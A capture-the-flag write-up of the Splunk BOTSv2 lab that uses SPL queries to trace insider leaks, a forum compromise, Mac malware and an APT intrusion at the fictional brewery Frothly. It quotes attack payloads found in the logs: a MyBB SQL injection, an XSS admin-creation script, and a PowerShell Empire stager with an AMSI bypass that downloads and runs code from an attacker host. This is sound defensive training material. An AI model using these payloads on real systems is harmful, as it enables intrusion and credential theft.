# Splunk 2

**BOTSv2 Dataset:**

BOTSv2 is a realistic Splunk security dataset containing Windows endpoint logs, Sysmon events, firewall data, network traffic, and IDS alerts. It is used to practice SOC investigations, threat hunting, incident response, and SPL query analysis within Splunk.

---
## Task 2 Dive into the Data

### What Data Is Available?

The `metadata` command provides a high-level summary of the data available within an index, similar to Splunk's Data Summary view. In this example, it is used to list the available sourcetypes in the `botsv2` index, along with their event counts and the first and last times data was observed.
 
The timestamp fields returned by `metadata` are stored as Unix epoch values. The `eval` command with `strftime()` is used to convert these timestamps into a human-readable date and time format.
 
```
| metadata type=sourcetypes index=botsv2
| eval firstTime=strftime(firstTime,"%Y-%m-%d %H:%M:%S")
| eval lastTime=strftime(lastTime,"%Y-%m-%d %H:%M:%S")
| eval recentTime=strftime(recentTime,"%Y-%m-%d %H:%M:%S")
| sort - totalCount
```
---
## Task 3: 100 Series Questions

Scenario: Investigate Amber Turing's communications with a potential competitor and identify the website visited, emails exchanged, contacts involved, and files sent.

---
### 1. Find Amber's IP Address

**Q1: Identify the Competitor Website**



Focus on PAN traffic logs, add this sourcetype to search:
```
index="botsv2" sourcetype="pan:traffic" amber 
```

**NOTE:** `pan:traffic` is the Palo Alto Networks firewall traffic log sourcetype. It contains network connection information recorded by a Palo Alto Networks firewall, including the usual source and destination IP addresses, ports, applications, actions, and web traffic details.

---
### 2. Review Amber's HTTP Activity

Search against Amber's IP address to show events that include this IP:
```
index="botsv2" "Ambers_IP_ADDR" sourcetype="stream:HTTP"
```

---
### 3. List Unique Websites Visited

Remove duplicates and display sites by appending dedup with variable (urkindex to filter by:
```index="botsv2" "Ambers_IP_ADDR" sourcetype="stream:HTTP"
| dedup site
| table site
```
Output:
```
website
website1
website2
...
```
The competitor's domain should stand out based on Frothly's industry. Or use industry-related keywords:

```
index="botsv2" IPADDR sourcetype="stream:HTTP" *INDUSTRY*
| dedup site
| table site
```
Output: Typically narrows results to the competitor website.


### Lab Question Answers

**Q1 Amber Turing was hoping for Frothly to be acquired by a potential competitor which fell through, but visited their website to find contact information for their executive team. What is the website domain that she visited?**

Search for references to Amber:
```
index="botsv2" amber
```
Expand on this to search IP traffic related to Amber on firewall traffic:
```
index="botsv2" amber sourcetype="pan:traffic"
```
There is only 1 IP for src_ip or client_ip likely related to amber: 10.0.2.101

Using that amber IP to further search since competitor is also beer related company try `beer`:
```
index="botsv2" 10.0.2.101 sourcetype="stream:HTTP" *beer*
| table site 
| dedup site
```
Leads to just one site: www.berkbeer.com


**Q2 Amber found the executive contact information and sent him an email. What image file displayed the executive's contact information? Answer example: /path/image.ext**

Using the website found:
```
index="botsv2" 10.0.2.101 sourcetype="stream:HTTP" www.berkbeer.com
| table uri_path
```
Then selecting the uri_path field in interesting fields there are 12 files. One most likely labelled ceoberk.png is likely the image with the email address.
/images/ceoberk.png

```
Top 10 Values             Count 	% 	 
/                         1       8.333% 	
/favicon.ico              1       8.333% 	
/images/bgimg01.jpg       1       8.333% 	
/images/ceoberk.png       1       8.333% 	
...
```

---
### 4. Focus on Traffic to the Competitor Website

```
index="botsv2" (ambers_IP_ADDR) sourcetype="stream:HTTP" COMPETITOR_WEBSITE
```
Output: HTTP activity between Amber and the competitor's website.

Use table to extract useful fields:

```
index="botsv2" IPADDR sourcetype="stream:HTTP" COMPETITOR_WEBSITE
| table uri uri_path site
```

**Q3 What is the CEO's name? Provide the first and last name.**

Similarly, can be applied to smtp stream:
```
index="botsv2" sourcetype="stream:smtp" amber
```
Filters down 26 smtp related events linked to word amber. 

The image in previous question however is called ceoberk which is a clue worth trying. Using berk instead of amber leads to just one event with streamsmtp making sense its from sender. Adding keyword 'berk' filters list to just event (same result if berk use without amber).

```
index="botsv2" sourcetype="stream:smtp" amber berk
```
- From content_body section in the line "Give me a call this afternoon if you= are free.=C2=A0=0A=0AMartin Berk..."
```
....
  Hello Amber, Great to hear from you, yes it is unfortunate 
the way things turned out. It would be great to speak with you directly,
I would also like to have Bernhard on the call as I think he might have some questions for you. 
Give me a call this afternoon if you are free.
Martin Berk
777.222.8765
mberk@berkbeer.com

----- Original Message -----
From: "Amber Turing" <aturing@froth.ly
To:"mberk@berkbeer.com" <mberk@berkbeer.com>
Sent:Fri, 11 Aug 2017 15:49:01 
Subject:Amber from Froth.ly
Mr. Bernhard, I was very sorry to hear about the acquisition falling through.
I was very excited to work with you in the future I have to admit, I am a little
worried about my future here. Id love to talk to you about some information I have
regarding my work. Amber Turing Principal Scientist Froth.ly

     
     <html><body ...Hello Amber,Great to hear from you, yes it is unfortunate the way things turned out. It would be great to speak with you directly, I would also like to have Bernhard on the call as I 
think he might have some questions for you. Give me a call this afternoon if you are free.
Martin Berk
CEO
777.222.8765
mberk@berkbeer.com

----- Original Message -----
From:"Amber Turing" 
origionalMessageToField" ...
To:"mberk@berkbeer.com" mberk@berkbeer.com
Sent:Fri, 11 Aug 2017 15:49:01 
Subject:Amber from From ...Mr. Bernhard, I was very sorry to hear about the acquisition falling through.
 was very excited to work with you in the future. I have to admit, I am a little worried=
 about my future here. Id love to talk to you about some inform=
ation I have regarding=0A my work.<br><br>=0AAmber Turing<br>=0APrincipa=
l Scientist<br>=0A867.322.112
Froth.ly...</body></html>
```

**Q4 What is the CEO's email address?**

This is in the same content_body or sender, sender_email section of event.

"mberk@berkbeer.com"

---
### 5. Investigate Email Communications

Identify Amber's email from previous results and use it for SMTP searches.

```
index="botsv2" sourcetype="stream:smtp" AMBERS_EMAIL COMPETITOR_WEBSITE
```

Useful fields may include:
```
| table sender recipient subject attachment
```

This assumes the fields are available for selection within the events. Here it was necessary to add fields through "Extract New" at bottom of events tab section to make that work. You can then create the extraction using either a regular expression (regex) or delimiter-based extraction. In this case, comma-delimited extraction works correctly.

**Q5 After the initial contact with the CEO, Amber contacted another employee at this competitor. What is that employee's email address?**

Another employee email address assuming same domain **@berkbeer.com** in place of berk in previous search, 6 results found:
```
index="botsv2" sourcetype="stream:smtp" @berkbeer.com
```
Out of the 6 after the last one from CEO, there is a 3 events, 

- At 8/29/17 11:03:08.879 AM CEO sends email to amber
- At 8/29/17 11:08:20.763 AM a relay packet from 
      - receiver_rcpt_to: [ [-]
     ubuntu@ec2-34-212-75-178.us-west-2.compute.amazonaws.com
      - sender_mail_from: hbernhard@berkbeer.com 
- At 8/29/17 11:08:20.962 AM Only 0.2 seconds later email from sender: hbernhard@berkbeer.com, sent to Amber appears
- At 8/30/17 3:08:00.075 PM Amber replies to this email from hbernhard@berkbeer.com


**Q6 What is the name of the file attachment that Amber sent to a contact at the competitor?**

Starting with:
```
index="botsv2" sourcetype="stream:smtp" @berkbeer.com
``` 
Then filtering further by adding attach_filename[] from 'All fields' section of events menu we find one docx file.
Email sent at 8/30/17 3:08:00.075 PM from Amber contains the attackment:
```
 attach_filename: [ [-]
     Saccharomyces_cerevisiae_patent.docx 
```



**Q7 What is Amber's personal email address?**

The last email sent from Amber in the content_body section there is base64 code, in it is a section:

Using splunk search parameters:
```
index="botsv2" sourcetype="stream:smtp" @berkbeer.com amber
```
```
...
VGhhbmtzIGZvciB0YWtpbmcgdGhlIHRpbWUgdG9kYXksIEFzIGRpc2N1c3NlZCBoZXJlIGlzIHRo
ZSBkb2N1bWVudCBJIHdhcyByZWZlcnJpbmcgdG8uICBQcm9iYWJseSBiZXR0ZXIgdG8gdGFrZSB0
aGlzIG9mZmxpbmUuIEVtYWlsIG1lIGZyb20gbm93IG9uIGF0IGFtYmVyc3RoZWJlc3RAeWVhc3Rp
ZWJlYXN0aWUuY29tPG1haWx0bzphbWJlcnN0aGViZXN0QHllYXN0aWViZWFzdGllLmNvb
...

converted from base64
...
Thanks for taking the time today, As discussed here is the document I was referring to.  Probably better to take this offline. Email me from now on at ambersthebest@yeastiebeastie.com<mailto:ambersthebest@yeastiebeastie.com>
...
```

---
## Task 4: 200 Series Questions

**Q1: TOR Version Installed by Amber**

Start with a keyword search:
```
index="botsv2" amber tor
```
This returns 325 events. Reverse the event order and add another keyword to narrow the results.

Nexy add a term that helps identify the TOR installation version. Trying KEYWORD 'install' shows the following in 125 events.
```
"C:\Users\amber.turing\Downloads\torbrowser-install-7.0.4_en-US.exe"
```

### Questions 2 & 3: BrewerTalk IPs

**Q2 The public IP address of brewertalk.com**

Use the techniques from previous searches.

```
index="botsv2" "brewertalk.com"
```
Then try field site leading to 4 DNS url and closer look leads to 4 sites

Then use field dest_ip and search external (2 out of the 10), leading to:
```
index="botsv2" "brewertalk.com" dest_ip="52.40.10.231"
```
Shows: 
```
Values                                                 Count     %
www.brewertalk.com                                     9,860     99.026%
brewertalk.com                                         86        0.864%
ec2-52-40-10-231.us-west-2.compute.amazonaws.com:8088  10        0.1%
45.77.65.211:9999                                      1         0.01%
```
Searching with first option using:
```
index="botsv2" "brewertalk.com" site="www.brewertalk.com"
```
Leads to IP for www.brewertalk.com, src_ip: 52.40.10.231:
```
   dest_ip: 172.31.4.249
   dest_mac: 0A:42:7E:25:21:B4
   dest_port: 80
   endtime: 2017-08-29T11:11:24.567153Z
   flow_id: b3e25a45-6a1c-452a-a55a-13e231b776dd
   http_comment: HTTP/1.1 200 OK
   http_content_type: text/html; charset=UTF-8
   http_method: GET
   http_user_agent: Splunk Website Monitoring (+https://splunkbase.splunk.com/app/1493/)
   protocol_stack: ip:tcp:http
   server: Apache/2.2.15 (CentOS)
   set_cookie: [ [+]]
   site: www.brewertalk.com
   src_ip: 52.40.10.231
   src_mac: 0A:96:DA:8D:C8:A1
   src_port: 57245
   status: 200 
```

**Q3 The IP address performing a web vulnerability scan against it**

The Scr_IP most likely performing a vulnerability assessment on www.brewertalk.com
```
index="botsv2" "www.brewertalk.com" sourcetype="stream:http"
```
Selecting the src_ip field lists source IP connecting to this site. The most likely IP scanning this site is 45.77.65.211.
```
Top 10 Values    Count 	% 	 
45.77.65.211     4,853   85.29% 	
52.40.10.231     317     5.571% 	
172.31.10.10     303     5.325% 	
10.0.2.109       90      1.582% 	
71.39.18.125     89      1.564% 	
174.209.13.154   23      0.404% 	
136.0.2.138      12      0.211% 	
136.0.0.125      3       0.053%
...
```
Alternatively search by count with src_ip:
```
index="botsv2" source="stream:http" "www.brewertalk.com"
| stats count by src_ip 
| sort -count
```

### Questions 4 & 5: Attack URI and SQL Function

**Q4 What URI path was attacked from the IP address in Question 3? (Include the leading /.)**

Using the attacker IP from Question 3:
```
index="botsv2" src_ip="ATTACKER_IP"
```

Tip: Set Sampling to 1:100 to avoid query cancellation. (Not required here)

This returns over 140,000 events. Use Interesting Fields to identify the targeted URI path. 

Then refine the search:
```
index="botsv2" src_ip="ATTACKER_IP" uri_path="URI_PATH"
```
Or try view stats of uri_path and reduce total events by filtering with source="stream:http" 
```
index="botsv2" source="stream:http" src_ip="45.77.65.211" 
| stats count by uri_path 
| sort -count
```
members.php is most likely with out sampling its close to 662.
```
uri_path    count
/member.php	662
/search.php	164
/	        47
/admin/	    6
```

**Q5 What SQL function was abused on that URI path?**

Review the results to determine the SQL function being abused.
```
8/16/17
3:25:19.017 PM	
{ [-]
   bytes: 3992
   bytes_in: 884
   bytes_out: 3108
   dest_ip: 172.31.4.249
   dest_mac: 0A:42:7E:25:21:B4
   dest_port: 80
   endtime: 2017-08-16T15:25:19.017145Z
   flow_id: 52283054-ec82-43ad-a2b5-359c626e2743
   form_data: regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1), 32, 31))),NULL) and '1
   http_comment: HTTP/1.1 503 Service Temporarily Unavailable
   http_content_length: 2194
   http_content_type: text/html; charset=UTF-8
   http_method: POST
   http_user_agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36
   protocol_stack: ip:tcp:http
   server: Apache/2.2.15 (CentOS)
   set_cookie: [ [+]
   ]
   site: www.brewertalk.com
   src_ip: 45.77.65.211
   src_mac: 0A:96:DA:8D:C8:A1
   src_port: 48128
   status: 503
   time_taken: 253608
   timestamp: 2017-08-16T15:25:18.927246Z
   transport: tcp
   uri_path: /member.php
} 
```
From here we try search with /member.php and look SQL, can also add keyword SELECT to search parameters, that shortens list to 68 from 598 events.
```
index="botsv2" source="stream:http" src_ip="45.77.65.211" uri_path="/member.php" SELECT
```

Taking a closer look at the form_data field (many show same form_data field content) contains:
```
regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1), 32, 31))),NULL) and '1
```
That payload is an error-based SQL injection attack.
```
updatexml(
NULL,
concat(0x3a,
(SUBSTRING(
(SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1),
32,31
))
),
NULL
)
```
Why it's error-based SQLi

UPDATEXML() is a MySQL XML function. When given malformed XML/XPath arguments, it intentionally generates a database error. Attackers abuse this because the error message can contain the result of a query.


### Questions 6 & 7: XSS Cookie and Spear-Phishing User

**Q6 What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of an XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign. The key indicator is:**

Start by gathering information about Kevin.
```
index="botsv2" source="stream:http" kevin
```
Only 3 events are found , the value of the cookie found was:
```
cookie: mybb[lastvisit]=1502408189; mybb[lastactive]=1502408191; sid=4a06e3f4a6eb6ba1501c4eb7f9b25228
```

```
8/16/17 3:19:16.770 PM	
{ [-]
   bytes: 4771
   bytes_in: 2879
   bytes_out: 1892
   cookie: mybb[lastvisit]=1502408189; mybb[lastactive]=1502408191; sid=4a06e3f4a6eb6ba1501c4eb7f9b25228
   dest_ip: 172.31.4.249
   dest_mac: 0A:42:7E:25:21:B4
   dest_port: 80
   endtime: 2017-08-16T15:19:16.770877Z
   flow_id: bd17b887-e15a-42ec-a00e-632a8222a26e
   form_data: username=kevin&password=8675309&do=login
   http_comment: HTTP/1.1 302 Found
   http_content_length: 0
   http_content_type: text/html; charset=UTF-8
   http_method: POST
   http_referrer: http://www.brewertalk.com/admin/index.php?module=user-titles&action=edit&utid=2%22%3E%3Cscript%3E%0Awindow.onload%3Dfunction(e)%7B%0A%20%20var%20my_post_key%20%3D%20document.getElementsByName(%22my_post_key%22)%5B0%5D.value%0A%20%20console.log(my_post_key)%3B%0A%20%20var%20postdata%3D%20%22my_post_key%3D%22%2Bmy_post_key%2B%22%26username%3DkIagerfield%26password%3Dbeer_lulz%26confirm_password%3Dbeer_lulz%26email%3DkIagerfield%40froth.ly%26usergroup%3D4%26additionalgroups%5B%5D%3D4%26displaygroup%3D4%22%3B%2F%2FPost%20the%20Data%0A%20%20var%20url%20%3D%20%22http%3A%2F%2Fwww.brewertalk.com%2Fadmin%2Findex.php%3Fmodule%3Duser-users%26action%3Dadd%22%3B%0A%20%20var%20http%3B%0A%20%20http%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20http.open(%22Post%22%2Curl)%3B%0A%0A%20%20http.setRequestHeader(%27Accept%27%2C%27text%2Fhtml%27)%3B%0A%20%20http.setRequestHeader(%27Content-type%27%2C%27application%2Fx-www-form-urlencoded%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxhtml%2Bxml%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxml%27)%3B%0A%20%20http.send(postdata)%3B%0A%20%20console.log(my_post_key)%3B%0A%7D%0A%3C%2Fscript%3E
```  

**Q7 Once you find the relevant events, determine the username created through a spear-phishing attack?**

Two ways to get it one is using the hint:

- Hint: This is the hint you’re looking for: The attacker stole Kevin's CSRF token (1bc3eab741900ab25c98eee86bf20feb) and performed a trick from domain squatters by using a homograph attack. Thats a simple letter substitution such as between Latin and Cyrillic.
- The other is that its found in the results from previous question below the cookie.

Using the hint first using keyword search:
```
index="botsv2"  kevin 1bc3eab741900ab25c98eee86bf20feb
```

Answer is found in 6 events, repeatedly in several fields percentage encoded and unencoded depending on field:
- form_data:
- dest_content: 
- http_referrer:
- src_headers:
- uri_query:

Easiest way was found in the 3 events found in Q6. These 3 packets also include Username kIagerfield. Here is the encoded section at end without the percentage encoding:
```
http://www.brewertalk.com/admin/index.php?module=user-titles&action=edit&utid=2">
<script>
window.onload=function(e){
var my_post_key = document.getElementsByName("my_post_key")[0].value
console.log(my_post_key);
var postdata= "my_post_key="+my_post_key+"&username=kIagerfield&password=beer_lulz&confirm_password=beer_lulz&email=kIagerfield@froth.ly&usergroup=4&additionalgroups[]=4&displaygroup=4";//Post the Data
var url = "http://www.brewertalk.com/admin/index.php?module=user-users&action=add";
var http;
http = new XMLHttpRequest();
http.open("Post",url);
 
http.setRequestHeader('Accept','text/html');
http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
http.setRequestHeader('Accept','application/xhtml+xml');
http.setRequestHeader('Accept','application/xml');
http.send(postdata);
console.log(my_post_key);
}
</script>
```
---
## Task 5: 300 Series

### Questions 1 & 2: Encrypted PowerPoint and Movie File

Find Mallory's MacBook
```
index="botsv2" mallory
```

Output:

- Over 11,000 events.
- Example:
```
Time               Event
8/29/17   
10:34:18.000 AM	
                   _mbsetupuser        /var/setup          Setup User
                   host = MACLORY-AIR13
                   source = usersWithLoginPrivs
                   sourcetype = usersWithLoginPrivs
```
Identify the hostname of Mallory's MacBook (MACLORY-AIR13)

Next search the MacBook:
```
index="botsv2" host="MACLORY-AIR13"
```
Output:
- Over 9 million events.
- Too broad to be useful.

Find the PowerPoint file
```
index="botsv2" host="MACLORY-AIR13" (*.ppt OR *.pptx)
```
Output:

Greatly reduced result set to 7 events.
Reveals the critical PowerPoint filename.
Led to command showing original and file basically copied with new name:
```
...
app
	zip -0_-P_UH9PUnpePPK0vYybBKRdMukR_/Volumes//FROTHLY/Home/mallory.kraeusen/Frothly_marketing_campaign_Q317.pptx.crypt_/Volumes//FROTHLY/Home/mallory.kraeusen/Frothly_marketing_campaign_Q317.pptx
...
```
Meaning:

zip = creates a ZIP archive
-0 = no compression
-P = password protect archive
UH9PUnpePPK0vYybBKRdMukR = ZIP password
First file path = output archive
Second file path = original file being archived

### Use the event details to determine the encrypted filename.

**Find the encrypted Game of Thrones movie**

- Use the same sourcetype that revealed the PowerPoint event. 
- In the previous case the extension crypt was present so that was tried.
```
index="botsv2" host="MACLORY-AIR13" *.crypt
```
From more "All fields" select columns.target_path:
```
columns.target_path

14 Values, 6.8% of events

Top 10 Values                                                               Count    % 	 
...
/Users/mallorykraeusen/Downloads/GoT.S07E02.BOTS.BOTS.BOTS.mkv.crypt        7        9.333% 	
/Users/mallorykraeusen/Downloads/GoT.S7E2.BOTS.BOTS.BOTS.mkv.torrent.crypt  6        8% 	
...
/Users/mallorykraeusen/Documents/Frothly_marketing_campaign_Q317.pptx.crypt 5        6.667% 	
...
```

Output:

File /Users/mallorykraeusen/Downloads/GoT.S07E02.BOTS.BOTS.BOTS.mkv.crypt. S07E02.




### Questions 3-7: USB Malware Investigation

**Q3 Kevin Lagerfield used a USB drive to move malware onto kutekitten, Mallory's personal MacBook. She ran the malware, which obfuscates itself during execution. Provide the vendor name of the USB drive Kevin likely used. Answer Guidance: Use time correlation to identify the USB drive.**

Begin with Mallory's personal MacBook, given Mallory's personal MacBook (kutekitten).
```
index="botsv2"  kutekitten usb
```
Led to about 40 events, further narrowed when events field "column.removeable=1" selected limiting output to just 4 events.
```
index="botsv2"  kutekitten usb "columns.removable"=1
```
Output:
```
8/3/17
6:18:10.000 PM	
{ [-]
   action: added
   calendarTime: Thu Aug 03 18:18:10 2017 UTC
   columns: { [-]
     model: Mass Storage
     model_id: 6387
     removable: 1
     serial: 849083BA
     usb_address: 1
     usb_port: 1
     vendor: Generic
     vendor_id: 058f
   }
   decorations: { [-]
     host_uuid: 00000000-0000-1000-8000-000C296A4C57
     username: mkraeusen
   }
   hostIdentifier: kutekitten.local
   name: pack_hardware-monitoring_usb_devices
   unixTime: 1501784290
}
```
From this looking into the following values:
"vendor":"Generic",
"vendor_id":"058f",
"model":"Mass Storage",
"model_id":"6387",
"serial":"849083BA"

The important identifiers are:

Vendor ID (VID): 058F → assigned to Alcor Micro Corp.
Product ID (PID): 6387 → commonly identified as an Alcor Micro flash drive / mass storage device.

**Q4 What programming language is at least part of the malware from the question above written in?**
From the above username "mkraeusen" obtained, combining with additional field "name" and within that is file_events.
```
index="botsv2"  kutekitten "decorations.username"=mkraeusen name=file_events
```
Narrows to 4 events, here there is an interesting file with file hashes related worth checking in virustotal.
```
8/3/17 6:19:07.000 PM	
{ ...
Type 	
		Field 					Value
Selected	
		columns.category 		Downloads	
		columns.md5				72d4d364ed91dd9418d144a2db837a6d
		columns.sha1			794bcba867307bdbd5f947f6c939eb4df1d2c9b8
		columns.sha256	befa9bfe488244c64db096522b4fad73fc01ea8c4cd0323f1cbdee81ba008271
		columns.target_path		/Users/mkraeusen/Downloads/Important_HR_INFO_for_mkraeusen	
		decorations.username	mkraeusen	
		host					kutekitten	
		hostIdentifier			kutekitten.local	
		source					/var/log/osquery/osqueryd.results.log	
		sourcetype				osquery_results	
Event	
		action					added	
		calendarTime			Thu Aug 03 18:19:07 2017 UTC
```
Using the MD5, SHA1, and SHA256 hashes associated with the file Important_HR_INFO_for_mkraeusen, a search on VirusTotal using the file hash reveals the following findings, however all that is required is that its perl script language:
```
Code insights - malicious
The provided Perl script functions as a cross-platform Remote Access Trojan (RAT) designed to operate on Unix-like operating systems (macOS and Linux).

Key observed behaviors include:

- Process Masquerading: Renames its execution process title ($0) to java to evade basic process monitoring.
- Embedded Payload Execution: Extracts, decodes (using XOR and decompressing byte patterns), and executes a secondary binary embedded within the __DATA__ section using inter-process communication (IPC::Open2).
- Command and Control (C2) Communication: Connects outbound via TCP sockets to hardcoded, obfuscated network addresses. It implements a custom binary protocol to exchange command bytes and serialized data.
- System Reconnaissance: Automatically collects and transmits initial host metadata including hostname, current username, and uptime.
- Remote Administration Capabilities: Implements handlers for various C2 commands, allowing an operator to:
       - Execute arbitrary shell commands and Perl code (eval).
       - Perform file system operations (read, write, copy, move, delete, list directories, and check file existence).
       - List and terminate running system processes.
       - Capture desktop screenshots using native utilities (screencapture on macOS or xwd/convert on Linux).
       - Resolve domain names and test outbound network connections (basic port scanning).

Basic properties
MD5		72d4d364ed91dd9418d144a2db837a6d
SHA-1	794bcba867307bdbd5f947f6c939eb4df1d2c9b8
SHA-256	befa9bfe488244c64db096522b4fad73fc01ea8c4cd0323f1cbdee81ba008271
...
File type Perl
Magic	Perl script text executable
...
History
First Seen In The Wild		2017-01-17 19:09:06 UTC
First Submission			2017-01-31 16:54:15 UTC
...
```
**Q5 When was this malware first seen in the wild? Answer Guidance: YYYY-MM-DD**

From basic properties on virustotal results: 2017-01-17 

**Q6 The malware infecting kutekitten uses dynamic DNS destinations to communicate with two C&C servers shortly after installation. What is the fully-qualified domain name (FQDN) of the first (alphabetically) of these destinations?**

This is obtained from virustotal while still using the same hash file, look for relations tab:
```
Domain 						Detections		Created	          Registrar
apis.apple.map.fastly.net 	| 0/91 		| - 			| -
apps.mzstatic.com 			| 0/91 		| 2010-07-12 	| NOM-IQ Ltd dba Com Laude
cdn.fwupd.org 				| 0/91 		| 2015-07-20 	| 1API GmbH
eidk.duckdns.org 			| 4/91 		| 2013-04-12 	| Gandi SAS
eidk.hopto.org 				| 10/91 	| 2000-02-17 	| No-IP Technologies, LLC
hh4de2.hopto.org 			| 3/91 		| 2000-02-17 	| No-IP Technologies, LLC
...
```
**Q6** eidk.duckdns.org

**Q7** eidk.hopto.org 	


---
## Task 6: 400 Series

**Q1 A Federal law enforcement agency reports that Taedonggang often spear phishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor?**
 
**malicious Taedonggang APT group**
 
-  Taedongang is this scenarios APT, attacking	Frothly Brewing Company network what is likely espionage or intellectual property theft
We know its a phishing campaign so filtering for 'attach_filename' by adding custom fields, using comma delimited filtering.
```
attach_filename{}

Values 									Count 		% 	 
Malware Alert Text.txt 					4 			36.364% 	
invoice.zip 							4 			36.364% 	
image.png 								2 			18.182% 	
GoT.S7E2.BOTS.BOTS.BOTS.mkv.torrent 	1 			9.091% 	
Office2016_Patcher_For_OSX.torrent 		1 			9.091% 	
Saccharomyces_cerevisiae_patent.docx 	1 			9.091% 	
```
Alternatively select one email, just click filename and hover until "Add To Search" appears and select. You should get something like the following, where i changed the file name change file name Saccharomyces_cerevisiae_patent.docx to *.* to select all files:
```
index=_* OR index=* sourcetype=stream:smtp | search "attach_filename{}"="*.*"
```
- It does state we are expecting zip files, so invoice.zip is the obvious file.
- Sender: Jim Smith (jsmith@urinalysis.com)
- Recipients: fyodor@froth.ly, btun@froth.ly, klagerfield@froth.ly, abungstein@froth.ly

**Q2 What is the password to open the zip file?**

- From the content section of the event the Password 912345678 is in the HTML code body section. Below that is an interesting large section of base64, near end is 'AAKSBAAAAAGludm' which converts to invoice.doc likely that is the zip file encoded in base64.
```
<html>....<body>.....
...As we have not received a =
service cessation letter, I am assuming that you might have accidentally =
overlooked this invoice ..... Pleaser refer to the =
attached document for payment details. Due to the personal nature of the =
account we have added a password to the document. Please enter the =
password (912345678).</div>
```

**Q3 The Taedonggang APT group encrypts most of their traffic with SSL. What is the "SSL Issuer" that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces.**

We already know from earlier the source of this traffic was most likely from earlier question 'Task 4, Q3 The IP address performing a web vulnerability scan against it', dest_ip="45.77.65.211 using a simple search again dest_ip and SSL, there are two listed ssl_issuers listed but only one value.

```
ssl_issuer
Values 	Count 	% 	 
C = US 	14,189 	58.981%
 	 	9,868 	41.019%
```

**Q4 What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith**

There is nothing in the scripts or events on either system that points to Ryan Kovar. Billy Tun's workstation appeared to run empire first.

- Since Empire is related to powershell I started with: 
```
index=botsv2 powershell

Then looked into:

index="botsv2" powershell sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
```
This still results in over 50,000 events looking at interesting fields selecting 'commandline' in top 10 is oa few interesting commands, ftp.exe and powershell related. The powershell command that stands out is as follows:
```
C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc WwBSAGUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAM....
AQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```
- From observation clearly encoded in base64, after decoding base64, removing null types, decoding url. What stands out is that this is likely a stager for Empire. Large parts cut out due to detection by antivirus, sorry about that (....).
```
[ReF].ASsEMbLY.GeTTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFIEld('amsiInitFailed',....
;$ser='https://45.77.65.211:443';$t='/admin/get.php';$dAtA=$WC.DOwnlOaDDatA($SER $t);$Iv=$DATA[0..3];$dATA=$DaTA[4..$DatA.LeNgTh];-join[ChAR[]](& $R $DATA ($IV $K))|IEXÔ
```
**Key Indicators**

AMSI Bypass
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')...
```
Sets:
```
amsiInitFailed = $true
```
This disables PowerShell's Anti-Malware Scan Interface so Defender and other AV products have a harder time inspecting the script.
Connection to attacker C2 IP we have seen earlier:
```
45.77.65.211:443/admin/get.php
```
Downloads the payload, decrypts and executes with IEX.



**The other FTP command was related but don't directly to this stager**

- Closer look at command line field in interesting fields there was unusual ftp download. 
- Most files in FTP traffic listed had some purpose likely related to C2 interactions:
- FTP method = RETR.
```
index=botsv2  sourcetype="stream:ftp" ("GET" OR "RETR")
```
From the 14 results the following appear twice.
```
FileLikely 					Purpose
나는_데이비드를_사랑한다.hwp	Initial lure document used for infection.
psexec.exe					Lateral movement and remote command execution. Common attacker tool.
nc.exe						Netcat. Reverse shells, bind shells, port forwarding.wget64.exeDownload additional payloads/tools.
python-2.7.6.amd64.msi		Install Python runtime on compromised systems.
dns.py						Potential custom script. Worth investigating. Name suggests DNS-related functionality.
winsys64.dll				Highly suspicious. In your Sysmon events it is used as an FTP script file via ftp.exe -i -s:winsys64.dll. Likely not actually a DLL. Two files similar name one is *32.dll other is *64.dll.
```
Downloads on each of 2 systems:
```
Victim 1 wrk-btun
Time (UTC)		Source IP	Destination IP	File
2017-08-24 03:36:15	10.0.2.107	160.153.91.7:21	dns.py
2017-08-24 03:36:15	10.0.2.107	160.153.91.7:21	nc.exe
2017-08-24 03:36:16	10.0.2.107	160.153.91.7:21	psexec.exe
2017-08-24 03:36:16	10.0.2.107	160.153.91.7:21	python-2.7.6.amd64.msi
2017-08-24 03:36:30	10.0.2.107	160.153.91.7:21	wget64.exe
2017-08-24 03:36:33	10.0.2.107	160.153.91.7:21	winsys64.dll
2017-08-24 03:36:34	10.0.2.107	160.153.91.7:21	나는_데이비드를_사랑한다.hwp

Victim 2 wrk-klagerf
Time (UTC)	Source IP	Destination IP	File
2017-08-24 03:59:57	10.0.2.109	160.153.91.7:21	dns.py
